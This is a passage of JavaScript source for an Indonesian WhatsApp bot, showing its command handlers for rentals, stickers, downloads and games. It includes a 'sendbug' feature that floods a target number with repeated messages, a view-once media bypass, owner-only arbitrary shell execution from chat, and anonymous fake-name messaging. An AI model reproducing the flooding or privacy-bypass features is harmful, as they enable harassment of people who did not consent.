{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa` } }]
conn.send5ButMessage  (Pe, fake, copyright, muk  )
	}
	setReply(`Berhasil mengirim Bug ke Nomer @${Pe.split("@")[0]}`)
	} catch (err){
	console.log(err)
	setReply("Gagal mengirim bug, Terjadi Error")
	}
	break
	
	
	
	case 'sendbug3':
	try{
	if(!isOwner) return onlyOwner()
	let Pe = q 
	console.log(Pe)
	if(!Pe ) return setReply("Masukan nomer target")
	if(Pe == Ownerin) return setReply("SendBug Gagal")
	await setReply(`Sending bug, waktu selesai 20 detik`)
	let a = await conn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
	for (let i = 0; i < 10; i++) {
	await sleep(2000)
	console.log("sending")
	await conn.sendMessage(Pe, { text: "awowkwkwk" }, { quoted: a });
	await conn.sendMessage(Pe, { text: "awowkwkwk" }, { quoted: lep });
	}
	setReply(`Berhasil mengirim Bug ke Nomer @${Pe.split("@")[0]}`)
	} catch (err){
	console.log(err)
	setReply("Gagal mengirim bug, Terjadi Error")
	}
	break
	
	
	case 'inspect':{
	const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
	let code = q.match(rex1);
	if (code === null) return  setReply("No invite url detected.");
	code = code[0].replace("chat.whatsapp.com/", "");
	let nana = await conn.groupGetInviteInfo(code)
	//console.log(nana)
	
	  
	let { id, subject,creator,creation,desc,descId } = await conn.groupGetInviteInfo(code).catch(async () => {
	return setReply("Invalid invite url.");
	});
	let text =
	`Subject: ${subject}\nGroupId: ${id}${creator ? `\nCreator: ${creator.split("@")[0]}` : ""}
	Create At: ${new Date(creation * 1000).toLocaleString()}` +`${desc ? `\nDesc: ${desc}\nDescId: ${descId}` : ""}`
	setReply(text)
	
	}
	break
	
	case 'givesaldo':{
	if(!q) return setReply("Masukan angka")
	if (isNaN(q)) return setReply(`Harus berupa angka`)
	if(!mentionByReply) return setReply("Reply tatgetnya")
	db.data.users[mentionByReply].balance = math(q)
	setReply(`Berhasil menambakan saldo ke nomer ${mentionByReply.split("@")[0]}`)
	}
	break
	
	
	case 'restart':
	if (!isOwner && !itsMe) return setReply(mess.only.owner)
	await setReply(`_Restarting ${fake}_`)
	await conn.sendMessage(from, {text: "_Succes_"})
	await sleep(3000)
	process.send('reset') 
	break
	
	
	
	case  'shutdown':
	if (!isOwner && !itsMe) return setReply(mess.only.owner)
	try{
	await conn.sendMessage(from, {text: "_Shuting Down..._"})
	await sleep(3000)
	await conn.sendMessage(from, {text: "_Succes_"})
	exec(`pm2 stop index.js`)
	return await conn.sendMessage(from, JSON.stringify(eval(process.exit())))  
	}catch{
	return await conn.sendMessage(from, JSON.stringify(eval(process.exit())))  
	}
	break
	
	case 'cutly':{
	if (!q) setReply('url/link nya mana?')
	let res = await fetch(`http://hadi-api.herokuapp.com/api/cuttly?url=${text}`)
	let json = await res.json()
	if (json.status) m.reply(json.result)
	else return setReply('Link Invalid!\nPeriksa url anda')
	}
	break
	
	case 'addsewa':{
	 if(!isGroup){
	const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
	let LinkGc = q.split(" ")[0];
	let Second = q.split(" ")[1];
	  let code = LinkGc.match(rex1);
	if (code == null) return  setReply("No invite url detected.");
	
	let kode = code[0].replace("chat.whatsapp.com/", "");
	await conn.groupAcceptInvite(kode)
	let { id, subject,creator,creation,desc,descId } = await conn.groupGetInviteInfo(kode).catch(async () => {
	return setReply("Invalid invite url.");
	});
	setReply(`Sukses`)
	
	await conn.sendButMessage(id, `HALO KAK AKU *${fake}*`, `Silahkan pilih salah satu`, [
	{buttonId: `${prefix}ceksewa`, buttonText: {displayText: `Cek sewa`,},type: 1},
	{buttonId: `${prefix}menu`, buttonText: { displayText: `Menu`,},type: 1}]);
	await _sewa.addSewaGroup(id, subject, LinkGc, Second, sewa)
	} else if(isGroup){
	if(!q) return setReply("Maukian angka 1m/1d/1h")
	if (isBotGroupAdmins) {
	let linkgc = await conn.groupInviteCode(from)
	var yeh = `https://chat.whatsapp.com/${linkgc}`
	} else if(!isBotGroupAdmins){
	var yeh = `Botz Is Not Admin`
	} 
	_sewa.addSewaGroup(from, groupName, yeh, q, sewa)
	setReply("Berhasil Add Sewa ke group")
	}
	}
	break
	
	case 'listsewa': 
	let ordernye = `*List Sewa*\nJumlah : ${sewa.length}\n\n`
	for (let i of sewa){
	let cekvipp = ms(i.expired - Date.now())
	ordernye += `Group : ${i.group}\nID : ${i.id}\nExpired : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\nLink : ${i.linkgc}\n\n`             
	 } 
	ordernye += `© ${fake1}`
	setReply(ordernye)
	break
	
	
	case 'ceksewa': 
	case 'sewacek':
	if (!isGroup) return setReply(mess.only.group)
	if (!_sewa.checkSewaGroup(from, sewa)) return setReply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
	let cekid = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
	let sewenye = `「 *SEWA EXPIRE* 」
	*Group*: ${groupName}
	*ID*: ${from}
	*EXPIRE :* ${cekid.days} Hari, ${cekid.hours} Jam, ${cekid.minutes} Menit, ${cekid.seconds} Detik`
	setReply(sewenye)
	break
	
	
	 case 'sewalist': 
	case 'listsewa':
	let txtnyee = `*List Sewa*\nJumlah : ${sewa.length}\n\n`
	for (let i of sewa){
	let cekvipp = ms(i.expired - Date.now())
	txtnyee += `Group : ${i.group}\nID : ${i.id}\nExpire : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\n\n`             
	} 
	txtnyee += `© ${fake1}`
	setReply(txtnyee)
	break 
	
	
	
	
	
	case 'sampah':{
	let path = require('path');
	let directoryPath = path.join();
	fs.readdir(directoryPath, async function (err, files) {
	if (err) {
	console.log('Unable to scan directory: ' + err);
	return setReply('Unable to scan directory: ' + err);
	 } 
	let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm") ||item.endsWith("jfif")   )
	console.log(filteredArray.length); 
    if(filteredArray.length == 0) return setReply(`Terdeteksi 0 File Sampah.`)
    let teks = '*List Sampah:*\n\n'
    await filteredArray.map(function(e, i){
	teks += (i+1)+`. ${e}\n`
	})
    teks += `\n*Total ada : ${filteredArray.length}*`
	const muk = [{ quickReplyButton: { displayText: `REMOVE ALL`, id: `${prefix}delsampah` } }]
	conn.send5ButImg(from, teks,copyright, fs.readFileSync('./stik/thumb.jpeg'), muk) 
    })
	  }
	break
	case 'delsampah':{
    if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
	let path = require('path');
	let directoryPath = path.join();
	fs.readdir(directoryPath, async function (err, files) {
	if (err) {
	console.log('Unable to scan directory: ' + err);
	return setReply('Unable to scan directory: ' + err);
	 } 
	let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm") ||item.endsWith("jfif")  )
	console.log(filteredArray.length); 
	let teks =`Terdeteksi ${filteredArray.length} file sampah\n\n`
	if(filteredArray.length == 0) return setReply(teks)
	filteredArray.map(function(e, i){
	teks += (i+1)+`. ${e}\n`
	})
	 
	setReply(teks) 
	
	await sleep(2000)
	setReply("Menghapus file sampah...")
	await filteredArray.forEach(function (file) {
	fs.unlinkSync(file)
	});
	await sleep(2000)
	setReply("Berhasil menghapus semua sampah")
	 
	});
	  }
	break
	
	
	
	case 'transfer':{
	if(!q) return setReply("Masukan angka")
	if (isNaN(q)) return setReply(`Harus berupa angka`)
	if(!mentionByReply) return setReply("Reply tatgetnya")
	let ane = Number(math(q))
	if (db.data.users[sender].balance < ane) return setReply(`Saldo kamu tidak mencukupi`)
	db.data.users[mentionByReply].balance = ane
	db.data.users[sender].balance -= ane
	setReply(`Berhasil mentransfer saldo ke nomer ${mentionByReply.split("@")[0]} sebesar Rp.${Number(q).toLocaleString()}`)
	}
	break
	
	
	  
	case 'setimgquoted':{
	if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
	if(isImage || isQuotedImage){
	let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
	await fse.copy(delb,`./stik/quoted.jpg`)
	fs.unlinkSync(delb)
	setReply(`Berhasil mengubah image quoted`)
	} else {
	setReply(`Kirim gambar dengan caption ${prefix+command}`);
	}
	}
	break;
	
	case 'ttp':{
	const text2png = require('text2png');
	await fs.writeFileSync('out.png', text2png(q, {font: '100px coolvetica rg',
		localFontPath: 'src/font/coolvetica rg.otf',
	  localFontName: 'coolvetica rg',                                            
	  color: 'white',
	  textAlign: "left",
	  lineSpacing: 10,
	  strokeColor: "black",
	  strokeWidth : 2,
	  padding: 20}))
	let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
	let media = fs.readFileSync('out.png')
	let jancok = new Sticker(media, {
		pack: packName, // The pack name
		author: authorName, // The author name
		type: StickerTypes.FULL, // The sticker type
		categories: ['🤩', '🎉'], // The sticker category
		id: '12345', // The sticker id
		quality: 70, // The quality of the output file
		background: '#FFFFFF00' // The sticker background color (only for full stickers)
	})
	let stok = getRandom(".webp")
	let nono = await jancok.toFile(stok)
	let nah = fs.readFileSync(nono)
	await conn.sendMessage(from,{sticker: nah},{quoted: dev})
	await fs.unlinkSync(stok)
	await fs.unlinkSync('out.png')
	}
	break
	
	case 'ranking':
	case 'rank':{
	function perbandinganSkor(key, order = 'asc') {
	return function innerSort(a, b) {
	if (!a.hasOwnProperty(key) || !b.hasOwnProperty(key)) {
	// property doesn't exist on either object
	return setReply("property doesn't exist on either object")
	}
	
	const varA = (typeof a[key] === 'string')? a[key].toUpperCase() : a[key];
	const varB = (typeof b[key] === 'string')? b[key].toUpperCase() : b[key];
	let comparison = 0;
	if (varA > varB) {
	comparison = 1;
	} else if (varA < varB) {
	comparison = -1;
	}
	
	return ((order === 'desc') ? (comparison * -1) : comparison);
	};
	}
	
	//Kemudian untuk menggunakannya dengan perintah berikut:
	
	let nana = user.sort(perbandinganSkor('level', 'desc'));
	let usernye = `*Ranking User*\nJumlah : ${nana.length}\n\n`
	nana.map(function(e, i){
	
	usernye += (i+1)+`.Nama : ${e.name}\n    Level : ${e.level}\n\n`
	});
	setReply(usernye)
	}
	break
	
	
	case 'tts':
	const gtts = require( 'node-gtts')
	function tts(text, lang = 'id') {
	// console.log(lang, text)
	return new Promise((resolve, reject) => {
	try {
	let tts = gtts(lang)
	let filePath =  (1 * new Date) + '.mp3'
	tts.save(filePath, text, () => {
	resolve(fs.readFileSync(filePath))
	fs.unlinkSync(filePath)
	})
	} catch (e) { reject(e) }
	})
	}
	
	const defaultLang = 'id'
	
	
	let lang = args[0]
	let text = args.slice(1).join(' ')
	if ((args[0] || '').length !== 2) {
	lang = defaultLang
	text = args.join(' ')
	}
	if (!text && m.quoted?.text) text = m.quoted.text
	
	let ras
	try { ras = await tts(text, lang) }
	catch (e) {
	m.reply(e + '')
	text = args.join(' ')
	if (!text) setReply( `Use example ${prefix}${command} en hello world`)
	ras = await tts(text, defaultLang)
	} finally {
	if (ras) conn.sendMedia(from, ras, dev, {caption: "Nih"})
	//conn.sendFile(m.chat, res, 'tts.opus', null, m, true)
	}
	
	break
	
	
	case 'zippy':
	case 'zippyshare':
	let { extract } = require( 'zs-extract')
	let { lookup } =  require( 'mime-types')
	  if (!args[0]) return setReply(`Masukkan URL zippyshare yang ingin didownload.\n\nContoh: ${prefix + command} https://www83.zippyshare.com/v/wD7mX1i0/file.html`)
	  if (!args[0].includes('zippyshare.com')) return setReppy( 'Invalid URL!\nPastikan URL merupakan URL zippyshare.')
	  setReply(mess.wait)
	  for (let i = 0; i < args.length; i++) {
		if (!args[i].includes('zippyshare.com/v')) continue
		let res = await extract(args[i])
		let mimetype = await lookup(res.download)
		conn.sendMessage(m.chat, { document: { url: res.download }, fileName: res.filename, mimetype }, { quoted: m })
	  }
	break
	
	
	
	case 'song': {
	if (q === 'help') {
	return m.reply(`*❗Command:* ${command}\n*🧩Category:* Search\n*🛠️Usage:* ${prefix + command} back in black\n\n*📚Description:* Sends song in Whatsapp `)
	}
	if (!args.join(" ")) return m.reply(`Example : ${prefix + command} Back in black`)
	let search = await yts(args.join(" "))
	let listSerch = []
	let teskd = `\n📂Result From *${args.join(" ")}*.\n\n*Select any Song🎵*`
	for (let i of search.all) {
	listSerch.push({
	title: i.title,
	rowId: `${prefix}playmp3 ${i.url}`,
	description: `Author : ${i.author.name} / ${i.timestamp}`
	})
	}
	const sections = [
	{
	title: "Total Search🔍" + search.all.length,
	rows: listSerch
	}
	]
	const listMessage = {
	text: teskd,
	footer: copyright,
	title: `*📂Youtube Search by ${copyright} 𝐌𝐝*`,
	buttonText: "FOUND",
	sections
	}
	conn.sendMessage(from, listMessage, {quoted: m})
	}
	break
	
	  case 'delchat':
	//const lastMsgInChat = await conn.getLastMessageInChat(from) // implement this on your end
	await conn.chatModify({
	  delete: true,
	  lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]
	},
	from)
	setReply("Sukses")
	break
	
	case "manga-search":
	const { Manga } = require("@shineiichijo/marika");
	const manga = new Manga();
	if (!q) return reply("Which manga do you want to search My Lord");
	let srh = await manga.searchManga(q);
	let mang = `*🎀Title: ${srh.data[0].title}*\n`;
	mang += `*📈Status: ${srh.data[0].status}*\n`;
	mang += `*🌸Total Volumes: ${srh.data[0].volumes}*\n`;
	mang += `*🎗Total Chapters: ${srh.data[0].chapters}*\n`;
	mang += `*🧧Genres:*\n`;
	for (let i = 0; i < srh.data[0].genres.length; i++) {
	mang += `\t\t\t\t\t\t\t\t*${srh.data[0].genres[i].name}*\n`;
	}
	mang += `*✨Published on: ${srh.data[0].published.from}*\n`;
	mang += `*🌟Score: ${srh.data[0].scored}*\n`;
	mang += `*🎐Popularity: ${srh.data[0].popularity}*\n`;
	mang += `*🎏Favorites: ${srh.data[0].favorites}*\n`;
	mang += `*✍Authors:*\n`;
	for (let i = 0; i < srh.data[0].authors.length; i++) {
	mang += `\t\t\t\t\t\t\t\t\t*${srh.data[0].authors[i].name}* *(${srh.data[0].authors[0].type})*\n`;
	}
	mang += `\n*🌐URL: ${srh.data[0].url}*\n\n`;
	if (srh.data[0].background !== null) mang += `*🎆Background:* ${srh.data[0].background}`;
	mang += `*❄️Description:* ${srh.data[0].synopsis.replace(
			  /\[Written by Sam]/g,
			  ""
			)}`;
			conn.sendMessage(
			  m.chat,
			  {
				image: {
				  url: srh.data[0].images.jpg.large_image_url,
				},
				caption: mang,
			  },
			  {
				quoted: m,
			  }
			);
			 break;
	
	
	case 'antidelete':{
	if (!isGroup) return setReply('Kusus group')
	if (!isGroupAdmins) return setReply(mess.only.admin)
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	 if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
	if (isAntidelete) return setReply("Sudah aktif!!");
	db.data.chats[from].antidelete = true
	setReply("Sukses mengaktifkan antidelete!");
	} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
	if (!isAntidelete) return setReply("Udah off!!");
	db.data.chats[from].antidelete = false
	setReply("Sukses mematikan antidelete!");
	} else if (!q) {
	conn.sendButMessage(from, `MODE ANTI DELETE`, `Silahkan pilih salah satu`, 
	[{buttonId: `${prefix}antidelete on`, buttonText: { displayText: `on`,},type: 1,},
	{buttonId: `${prefix}antidelete off`, buttonText: { displayText: `off`,}, type: 1}, ]);
	 }
	 }
	break
	
	 case 'exec':{
	if (!itsMe && !isOwner) return onlyOwner()
	await setReply("_Executing..._")
	exec(q, async (err, stdout) => {
	if (err) return setReply(`${copyright}:~ ${err}`)
	if (stdout) {
	await setReply(`${stdout}`)
	let teks = `Berhasil menginstall module ${q.replace("npm i","")}`
	let mok = [{"buttonId": `${prefix}restart`,"buttonText": {"displayText": `Restart`},"type": "RESPONSE"}]
	let tolol = {
	text: teks,
	footer: `${copyright}`,
	buttons: mok,
	headerType: 1
	}
	await conn.sendMessage(from, tolol , {quoted: dev})
	}
	})
	}
	break
	
	 case 'afk':{
	 let user = global.db.data.users[sender]
	 user.afk = + new Date
	 user.afkReason = q
	 setReply(`@${m.sender.split('@')[0]} telah AFK dengan alasan ${q ? ': ' + q : ''}`)
	}
	break
	
	case 'listblock':{
	let block = await conn.fetchBlocklist()            
	setReply('List Block:\n\n' + `Total: ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`)
	}
	break 
	
	case 'listprem':{
		let txt = `*── 「 LIST PREMIUM 」 ──*\nTotal : ${premium.length}\n\n`
		let men = [];
		for (let i of premium){
		men.push(i.id)
        let usprem = i.id.replace(/[@s.whatsapp.net]/g, "")
		let cekvip = ms(i.expired - Date.now())
		txt += `*ID :* @${usprem}\n*Expired :* ${cekvip.days} Hari ${cekvip.hours} Jam ${cekvip.minutes} Menit ${cekvip.seconds} Detik\n\n`
		}
		mentions(txt, men, true)
		}
		break

	
	
	case 'anonfile':{
	const anonfile = require('anonfile-lib')
	//if (!isAllMedia) return setReply( `Kirim File yang ingin diunggah dan reply medianya dengan perintah *${prefix}${command}*`)
	let filename = q ? q : 'AnonFiles-'+Math.floor(Math.random() * 999999999)
	let media = await conn.downloadAndSaveMediaMessage(quoted, filename)
		//await fs.writeFileSync(`./tmp/${filename}`, media)
	let info = await anonfile.upload(media)
	if(info.status !== true) setReply( `GAGAL`)
	let response = `*───「 ANONFILES UPLOADER 」───*
	Sukses Mengunggah File
	
	Nama File : ${info.data.file.metadata.name}
	Ukuran File : ${info.data.file.metadata.size.readable}
	Link : ${info.data.file.url.full}
	Short : ${info.data.file.url.short}
	`
	 await setReply(response)
	 await  fs.unlinkSync(media)
	 }
	 break
	
	case 'infogempa':{
	let scrapy = require("node-scrapy")
	const model = ['tr:nth-child(1) td']
	fetch('https://www.bmkg.go.id/gempabumi/gempabumi-terkini.bmkg').then((res) => res.text()).then((body) => {
	let result = scrapy.extract(body, model)
	let waktu = result[1] || "Tidak ada data"
	let lintang = result[2] || "Tidak ada data"
	let bujur = result[3] || "Tidak ada data";
	let magnitudo = result[4] || "Tidak ada data"
	let kedalaman = result[5] || "Tidak ada data"
	let lokasi = result[6] || "Tidak ada data"
	const teks = `informasi gempa terbaru:\n\nWaktu: *${waktu}*\nBujur: *${bujur}*\nLintang: *${lintang}*\nMagnitudo: *${magnitudo}*\nKedalaman: *${kedalaman}*\nLokasi: *${lokasi}*`.trim()
	setReply(teks)
	 })
	 }
	 break
	
	
	case 'caklontong':{
	let timeout = 180000
	let poin = 500
	let tiketcoin = 1
	let id = m.chat
	if (id in conn.caklontong) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	${json.soal}
	
	Timeout *${(timeout / 1000).toFixed(2)} detik*
	Ketik ${prefix}calo untuk bantuan
	Bonus: ${poin} XP
	Tiketcoin: ${tiketcoin} TiketCoin
	`.trim()
	conn.caklontong[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	if (conn.caklontong[id]) setReply(`Waktu habis!\nJawabannya adalah *${json.jawaban}*\n${json.deskripsi}`)
	delete conn.caklontong[id]
	 }, timeout)
	 ]
	}
	break
	
	case 'family100': {
	let winScore = 1000
	let id = m.chat
	if (id in conn.family) return setReply('Masih ada kuis yang belum terjawab di chat ini') 
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	*Soal:* ${json.soal}
	
	Terdapat *${json.jawaban.length}* jawaban${json.jawaban.find(v => v.includes(' ')) ? `
	(beberapa jawaban terdapat spasi)
	`: ''}
	
	+${winScore} Money tiap jawaban benar
		`.trim()
		conn.family[id] = {
			id,
			msg: await m.reply(caption),
			...json,
			terjawab: Array.from(json.jawaban, () => false),
			winScore,
		}
	}
	break
	
	
	
	
	case 'readviewonce': {
	let { downloadContentFromMessage } = require('@adiwajshing/baileys')
	if (!m.quoted) return setReply(`Balas pesan viewOnce nya!`)
	if (m.quoted.mtype !== 'viewOnceMessage') return setReply( 'Yang kamu balas bukan pesan viewOnce')
	let type = Object.keys(m.quoted.message)[0]
	let qu = m.quoted.message[type]
	let media = await downloadContentFromMessage(qu, type == 'imageMessage' ? 'image' : 'video')
	let buffer = Buffer.from([])
	for await (const chunk of media) {
	buffer = Buffer.concat([buffer, chunk])
	}
	if (/video/.test(type)) {
	return conn.sendFile(m.chat, buffer, 'media.mp4', q.caption || '', m)
	} else if (/image/.test(type)) {
	return conn.sendFile(m.chat, buffer, 'media.jpg', q.caption || '', m)
	}
	}
	break
	
	
	case 'savefile':{
	if (!q) return setReply( `where is the path?\n\nexample:\n${prefix + command} plugins/menu.js`)
	if (!m.quoted.text) return setReply( `reply code`)
	let path = `${q}`
	await require('fs').writeFileSync(path, m.quoted.text)
	setReply(`Saved ${path} to file!`)
	}
	break
	
	
	case  'apk': {
	if (!args.join(" ")) return m.reply(`Example : ${prefix + command} Back in black`)
	let search = await apkmody(q)
	let listSerch = []
	let teskd = `\n📂Result From *${args.join(" ")}*.\n\n*Select any Song🎵*`
	for (let i of search) {
	listSerch.push({
	title: i.name,
	rowId: `${prefix}apkdownload ${i.link}`,
	description: `Desc : ${i.desc}`
	})
	}
	const sections = [
	{
	title: "Total Search🔍" + search.length,
	rows: listSerch
	}
	]
	const listMessage = {
	text: teskd,
	footer: copyright,
	title: `*📂Youtube Search by ${copyright} 𝐌𝐝*`,
	buttonText: "FOUND",
	sections
	}
	conn.sendMessage(from, listMessage, {quoted: m})
	}
	break
	
	// MENFESS BY SATGANZDEVS|
    case "menfes":
      case "menfess":
        if (isGroup) return setReply('fitur tidak dapat di gunakan di grup!')
        if (!q)
          return setReply(`example ${prefix + command} 6282xxxxx|Nama Palsu`);
        var anoname = q.split("|")[1];
        if (!anoname)
          return setReply(`Example : ${prefix + command} 6282xxxxx|Nama Palsu`);
        this.menfess = this.menfess ? this.menfess : {};
        let no =
          q
            .split("|")[0]
            .replace(/[^0-9]/g, "")
            .replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        let tagsv = no
          .replace(/[@s.whatsapnet]/g, "")
          .replace(/[@S.WHATSAPNET]/g, "");
        var cekon = await conn.onWhatsApp(no);
        if (no == sender) return setReply("Tidak Bisa Menfess Diri Sendiri");
        if (cekon.length == 0)
          return setReply(
            `Nomor tersebut tidak terdaftar di whatsapp\n\nMasukkan nomer yang valid/terdaftar di WhatsApp`
          );
        let id = +new Date();
        this.menfess[id] = {
          id,
          a: sender,
          b: no,
          state: "WAITING",
          check: function (who = "") {
            return [this.a, this.b].includes(who);
          },
          other: function (who = "") {
            return who === this.a ? this.b : who === this.b ? this.a : "";
          },
        };
        let name2 = await conn.getName(no);
        let pjtxt = `Halo ${name2}👋\n${anoname}\nMengajak Mu\n\nBermain Anonymous Chat!`;
        let buttmess = {
            text: pjtxt,
            footer: copyright,
            buttons: [{"buttonId": `${prefix}confirm`,"buttonText": {"displayText": `KONFIRMASI`},"type": "RESPONSE"}],
            headerType: 4
        }
        await conn.sendMessage(no, buttmess)
        let akhji = `Menunggu Konfirmasi Dari\n ${
          tagsv.split("@")[0]
        }\nStatus: Waiting`;
        await setReply(akhji)
        break;
      case "delmenfess":
      case "dm": {
        if (isGroup) return reply("Fitur Tidak Dapat Digunakan Untuk Group!");
        this.menfess = this.menfess ? this.menfess : {};
        let room = Object.values(this.menfess).find((room) =>
          room.check(sender)
        );
        if (!room) {
         setReply(`\`\`\`Kamu Sedang Tidak Berada Di Sesi Menfess\`\`\``)
        } else if (room) {
          setReply(`\`\`\`Kamu Telah Meninggalkan Sesi Menfess\`\`\``);
          let other = room.other(sender);
          if (other)
            await conn.sendMessage(other, { id: m.key.id, contextInfo: {   forwardingScore: 10, isForwarded: true, externalAdReply:{showAdAttribution: true, title: `${baileysVersion}`,body:`Runtime ${runtime(process.uptime())} `,previewType:"PHOTO",thumbnail: fs.readFileSync('./stik/reply.jpg'),mediaUrl: "https://g.satganzdevs.repl.co",sourceUrl: "https://g.satganzdevs.repl.co"}},showAdAttribution: true, text:`\`\`\`Partner Telah Meninggalkan Sesi Menfess\`\`\``}, { quoted: dev })
          delete this.menfess[room.id];
        }
        if (command === "leave") break;
      }
      case "confirm":
        {
          if (isGroup)
            return setReply("Fitur Tidak Dapat Digunakan Untuk Group!");
          this.menfess = this.menfess ? this.menfess : {};
          let room = Object.values(this.menfess).find(
            (room) => room.state === "WAITING"
          );
          if (room) {
            await  conn.sendMessage(room.a, { id: m.key.id, contextInfo: {   forwardingScore: 10, isForwarded: true, externalAdReply:{showAdAttribution: true, title: `${baileysVersion}`,body:`Runtime ${runtime(process.uptime())} `,previewType:"PHOTO",thumbnail: fs.readFileSync('./stik/reply.jpg'),mediaUrl: "https://g.satganzdevs.repl.co",sourceUrl: "https://g.satganzdevs.repl.co"}},showAdAttribution: true, text:`\`\`\`BERHASIL MENYAMBUNGKAN MENFESS\`\`\``}, { quoted: dev })
            room.state = "CHATTING"
          } else if (!room) {
            let buttmess = {
            text:`\`\`\`Masih Ada Sesi Menfess Sebelumnya, Tekan Tombol Di Bawah Untuk Menghentikan Sesi Menfess Sebelumnya\`\`\``,
            footer: copyright,
            buttons: [{"buttonId": `${prefix}dm`, "buttonText": {"displayText": `DELETE MENFESS`},"type": "RESPONSE"}],
            headerType: 4
        }
          await conn.sendMessage(from, buttmess)
          }
        }
        break;
	case 'attp2':{
	 async function attp(text){
	  return new Promise(async(resolve, reject) => {
	  const getid = await axios.get('https://id.bloggif.com/text')
	  const id = cheerio.load(getid.data)('#content > form').attr('action')
	  const options = {
				method: "POST",
				url: `https://id.bloggif.com${id}`,
				headers: {
					"content-type": 'application/x-www-form-urlencoded',
					"user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
				},
				formData: {
					target: 1,
					text: text,
					glitter_id: Math.floor(Math.random() * 2821),
					font_id: 'lucida_sans_demibold_roman',
					size: 50,
					bg_color: 'FFFFFF',
					transparent: 1,
					border_color: '000000',
					border_width: 2,
					shade_color: '000000',
					shade_width: 1,
					angle: 0,
					text_align: 'center'
				},
			};
			request(options, async function(error, response, body) {
			  if (error) return new Error(error)
			  const $ = cheerio.load(body)
			  const url = $('#content > div:nth-child(10) > a').attr('href')
			  resolve({status: 200, author: "lala", result: 'https://id.bloggif.com' + url})
			})
		})
	}
	let nana = await attp(q)
	let { Sticker, StickerTypes } = require('wa-sticker-formatter')
	await makeSticker(nana.result,Sticker, StickerTypes)
	}
	break
	
	case 'sfile': {
		async function sfileSearch(query, page = 1) {
		let res = await fetch(`https://sfile.mobi/search.php?q=${query}&page=${page}`)
		let $ = cheerio.load(await res.text())
		let result = []
		$('div.list').each(function () {
			let title = $(this).find('a').text()
			let size = $(this).text().trim().split('(')[1]
			let link = $(this).find('a').attr('href')
			if (link) result.push({ title, size: size.replace(')', ''), link })
		})
		return result
	}
	
	async function sfileDl(url) {
		let res = await fetch(url)
		let $ = cheerio.load(await res.text())
		let filename = $('div.w3-row-padding').find('img').attr('alt')
		let mimetype = $('div.list').text().split(' - ')[1].split('\n')[0]
		let filesize = $('#download').text().replace(/Download File/g, '').replace(/\(|\)/g, '').trim()
		let download = $('#download').attr('href') + '&k=' + Math.floor(Math.random() * (15 - 10 + 1) + 10)
		return { filename, filesize, mimetype, download }
	}
		
		if (q.match(/(https:\/\/sfile.mobi\/)/gi)) {
			let res = await sfileDl(q)
			if (!res) return setReply('Error :/')
			await setReply(Object.keys(res).map(v => `*• ${v}:* ${res[v]}`).join('\n') + '\n\n_Sending file..._')
			conn.sendMessage(m.chat, { document: { url: res.download }, fileName: res.filename, mimetype: res.mimetype }, { quoted: m })
		} else if (q) {
			let [query, page] = q.split`|`
			let res = await sfileSearch(query, page)
			if (!res.length) return setReply( `Query "${text}" not found :/`)
			rus = res.map((v) => `*Title:* ${v.title}\n*Size:* ${v.size}\n*Link:* ${v.link}`).join`\n\n`
			setReply(rus)
		} else return setReply( 'Input Query / Sfile Url!')
	}
	break

  case 'update': {
const lala = JSON.parse(fs.readFileSync('./package.json'))
 
let listSerch = []
let listmodule = Object.keys(lala.dependencies)
    let nono = Object.entries(lala.dependencies)
    let teskd = `\nResult From *Package.json*\n\n*Select any module*`
    for (let i of nono) {
    listSerch.push({
    title: i[0],
    rowId: `${prefix}listversion npm view ${i[0]} versions --json`,
    description: `${i[1]}`
    })
    }
    const sections = [
    {
    title: "Total Module " + listmodule.length,
    rows: listSerch
    }
    ]
    const listMessage = {
    text: teskd,
    footer: copyright,
    title: `*Update Dependencies*`,
    buttonText: "FOUND",
    sections
    }
    conn.sendMessage(from, listMessage, {quoted: m})
    }
    break 




    
 case 'listversion':{
if (!itsMe && !isOwner) return onlyOwner()
exec(q, async (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
let listSerch = []

    let teskd = `\nSilakan pilih versi module yang ingin di install\n`
  let module = q.split('view')[1].replace(" versions",'').replace(' --json','').replace(' ','')

  let yaya = JSON.parse(stdout)
  
 // Log(yaya)
    for (let i of yaya) {

    listSerch.push({
    title: module,
    rowId: `${prefix}$ npm i ${module}@${i}`,
    description: `🔖 V${i}`
    })
    }
  
